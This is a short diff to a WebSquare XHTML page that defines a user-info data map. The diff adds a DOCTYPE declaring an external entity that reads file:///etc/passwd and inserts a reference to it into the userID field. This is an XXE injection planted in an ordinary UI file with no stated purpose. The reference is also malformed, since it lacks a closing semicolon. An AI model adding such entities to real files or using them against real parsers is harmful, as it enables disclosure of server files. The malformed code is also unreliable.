@@ -1,5 +1,6 @@
 
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <html xmlns="http://www.w3.org/1999/xhtml" xmlns:ev="http://www.w3.org/2001/xml-events" xmlns:w2="http://www.inswave.com/websquare" xmlns:xf="http://www.w3.org/2002/xforms">
 	<head>
 		<w2:buildDate />
@@ -15,7 +16,7 @@
 				</w2:dataMap>
 				<w2:dataMap id="dm_userInfo">
 					<w2:keyInfo>
-						<w2:key id="userID" name="아이디" dataType="text"></w2:key>
+						<w2:key id="userID" name="아이디" dataType="text">&xxe</w2:key>
 						<w2:key id="userName" name="이름" dataType="text"></w2:key>
 						<w2:key id="address" name="주소" dataType="text"></w2:key>
 					</w2:keyInfo>
